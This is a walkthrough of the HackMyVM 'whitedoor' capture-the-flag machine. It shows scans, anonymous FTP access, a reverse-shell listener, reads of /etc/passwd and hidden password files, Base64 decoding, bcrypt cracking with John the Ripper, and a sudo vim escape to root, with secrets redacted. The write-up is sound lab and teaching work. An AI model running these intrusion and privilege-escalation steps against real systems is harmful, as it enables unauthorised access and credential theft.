# whitedoor

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| whitedoor | Unknown | Beginner | HackMyVM |

**Summary:** The exploitation of the whitedoor machine began with a comprehensive reconnaissance phase that identified an anonymous FTP service and a web server. Initial access was achieved by discovering a remote code execution vulnerability on the web application, which allowed for the establishment of a reverse shell as the service user. Once inside, enumeration of the home directories revealed a hidden password file belonging to the user whiteshell. This password was obfuscated using multiple layers of Base64 encoding. After decoding the credentials, lateral movement was performed via SSH. Further investigation into the file system led to the discovery of a bcrypt password hash for the user Gonzalo. This hash was successfully cracked using a dictionary attack, granting access to the second user account. Finally, privilege escalation was accomplished by exploiting a sudo configuration that permitted Gonzalo to execute the vim text editor with root privileges without a password, enabling the creation of a root shell.

---

## Reconnaissance

The initial phase involved identifying the target on the network and performing a full port scan to determine the attack surface.

1. **Network Scanning**: The target was located at the IP address 192.168.100.180 using a custom network scanning script.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.180 08:00:27:41:24:B4 VirtualBox
```

2. **Service Discovery**: A deep Nmap scan was conducted to identify open ports and the versions of the services running on them.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ nmap -sC -sV -p- 192.168.100.180
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-08 18:57 WIB
Nmap scan report for 192.168.100.180
Host is up (0.0040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey:
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
```

3. **FTP Enumeration**: The FTP service allowed for anonymous login. A file named README.txt was retrieved but contained only a message of encouragement.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ ftp 192.168.100.180
Connected to 192.168.100.180.
220 (vsFTPd 3.0.3)
Name (192.168.100.180:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47377|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        110          4096 Nov 16  2023 .
drwxr-xr-x    2 0        110          4096 Nov 16  2023 ..
-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||35612|)
150 Opening BINARY mode data connection for README.txt (13 bytes).
100% |*************|    13       10.26 KiB/s    00:00 ETA
226 Transfer complete.
13 bytes received in 00:00 (4.39 KiB/s)
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ cat README.txt
¡Good luck!
```

4. **Web Enumeration**: Navigating to the web server revealed a standard home page.

![alt text](image.png)

Further inspection of the web application led to the discovery of an entry point that appeared to allow for remote command execution.

![alt text](image-1.png)

## Initial Access

1. **Exploitation**: By leveraging the identified vulnerability, a reverse shell payload was crafted to gain a foothold on the system.

![alt text](image-2.png)

A listener was started on the local machine to capture the incoming connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

2. **Shell Stabilization**: Upon receiving the connection, the shell was upgraded to a fully interactive TTY for better control.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 52154
bash: cannot set terminal process group (471): Inappropriate ioctl for device
bash: no job control in this shell
www-data@whitedoor:/var/www/html$ cd /
cd /
www-data@whitedoor:/$ which python3
which python3
www-data@whitedoor:/$ which script
which script
/usr/bin/script
www-data@whitedoor:/$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@whitedoor:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@whitedoor:/$ export SHELL=/bin/bash
www-data@whitedoor:/$ export TERM=xterm
www-data@whitedoor:/$ stty rows 75 cols 125
```

## Lateral Movement

1. **User Enumeration**: The system was checked for other user accounts and their respective home directory permissions.

```bash
www-data@whitedoor:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
whiteshell:x:1001:1001::/home/whiteshell:/bin/bash
Gonzalo:x:1002:1002::/home/Gonzalo:/bin/bash
www-data@whitedoor:/$ ls -la /home
total 16
drwxr-xr-x  4 root       root       4096 Nov 16  2023 .
drwxr-xr-x 18 root       root       4096 Nov 15  2023 ..
drwxr-x---  9 Gonzalo    whiteshell 4096 Nov 17  2023 Gonzalo
drwxr-xr-x  9 whiteshell whiteshell 4096 Nov 17  2023 whiteshell
```

2. **Credential Recovery**: A hidden file containing a password was discovered in the home directory of whiteshell.

```bash
www-data@whitedoor:/$ cd /home/whiteshell/
www-data@whitedoor:/home/whiteshell$ ls -la Desktop/
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16  2023 .my_secret_password.txt
www-data@whitedoor:/home/whiteshell$ cat Desktop/.my_secret_password.txt
whiteshell:Vkd[REDACTED]
```

The password string was decoded twice using Base64 to reveal the cleartext password.

```bash
www-data@whitedoor:/home/whiteshell$ which base64
/usr/bin/base64
www-data@whitedoor:/home/whiteshell$ echo 'Vkd[REDACTED]' | base64 -d
VGg[REDACTED]
www-data@whitedoor:/home/whiteshell$ echo 'Vkd[REDACTED]' | base64 -d | base64 -d
Th1[REDACTED]
```

3. **SSH Access**: The recovered credentials were used to authenticate as whiteshell via SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ ssh whiteshell@192.168.100.180
whiteshell@192.168.100.180's password:
Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 17 18:08:29 2023 from 192.168.2.5
whiteshell@whitedoor:~$ id
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
```

4. **Second Lateral Movement**: Further enumeration revealed a password hash in the home directory of Gonzalo.

```bash
whiteshell@whitedoor:~$ ls -la /home/Gonzalo
total 52
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17  2023 .
drwxr-xr-x 4 root    root       4096 Nov 16  2023 ..
-rw------- 1 Gonzalo Gonzalo     718 Nov 17  2023 .bash_history
-rw-r--r-- 1 Gonzalo Gonzalo     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Gonzalo Gonzalo    3526 Apr 23  2023 .bashrc
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 Desktop
drwxr-xr-x 2 root    Gonzalo    4096 Nov 16  2023 Documents
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 Downloads
drwxr-xr-x 3 Gonzalo Gonzalo    4096 Nov 16  2023 .local
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 Music
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 Pictures
-rw-r--r-- 1 Gonzalo Gonzalo     807 Apr 23  2023 .profile
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17  2023 Public
whiteshell@whitedoor:~$ find /home/Gonzalo -readable -type f 2>/dev/null
/home/Gonzalo/.profile
/home/Gonzalo/.bash_logout
/home/Gonzalo/.bashrc
/home/Gonzalo/Desktop/.my_secret_hash
```

```bash
whiteshell@whitedoor:~$ cat /home/Gonzalo/Desktop/.my_secret_hash
$2y$10$[REDACTED]
```

5. **Hash Cracking**: The bcrypt hash was cracked using John the Ripper and the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ echo '$2y$10$[REDACTED]' > hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/whitedoor]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
q[REDACTED]       (?)
1g 0:00:00:04 DONE (2026-05-08 19:18) 0.2083g/s 75.00p/s 75.00c/s 75.00C/s strawberry..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The cracked password allowed for a transition to the Gonzalo user.

```bash
whiteshell@whitedoor:/var/www/html$ su - Gonzalo
Password:
Gonzalo@whitedoor:~$ id
uid=1002(Gonzalo) gid=1002(Gonzalo) groups=1002(Gonzalo)
```

## Privilege Escalation

1. **Sudo Enumeration**: Checking the sudo permissions for Gonzalo revealed a significant misconfiguration.

```bash
Gonzalo@whitedoor:~$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

2. **Root Exploitation**: The permission to run vim as root without a password was exploited to escape the editor and gain a root shell.

```bash
Gonzalo@whitedoor:~$ sudo /usr/bin/vim -c ':!sudo -i'

root@whitedoor:~# id
uid=0(root) gid=0(root) groups=0(root)
root@whitedoor:~# hostname
whitedoor
root@whitedoor:~# whoami
root
```

3. **Flag Capture**: Both user and root flags were retrieved to complete the challenge.

```bash
root@whitedoor:~# find / -type f -name "user.txt" 2>/dev/null | xargs cat
Y0u[REDACTED]
root@whitedoor:~# cat root.txt
Y0u[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Discovered open ports for FTP, SSH, and HTTP, including anonymous FTP access.
2. **Vulnerability Discovery**: Found a remote code execution vulnerability on the web application.
3. **Exploitation**: Established a reverse shell as www-data and stabilized the connection.
4. **Internal Enumeration**: Recovered an obfuscated password for whiteshell and a bcrypt hash for Gonzalo.
5. **Privilege Escalation**: Leveraged a sudo misconfiguration in vim to obtain full root access.

